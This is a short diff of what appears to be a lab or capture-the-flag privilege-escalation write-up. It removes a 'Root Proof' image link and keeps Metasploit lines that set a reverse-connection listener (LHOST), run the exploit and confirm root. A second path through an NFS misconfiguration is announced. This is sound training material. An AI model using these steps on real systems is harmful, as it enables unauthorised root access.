@@ -64,7 +64,6 @@ set LHOST <192.168.18.5>
 run
 getuid # Server username : root
 ```
-![Root Proof](https://1drv.ms/i/c/d38a9571dd9969b9/IQA7YKl5nK_sRI1xUrwhjNzPAXB8J-kGOy9omXO2iZWLuEk?e=hymRdU)
 
 ## Privilege Escalation Enumeration--Path2
 (NFS Misconfiguration)
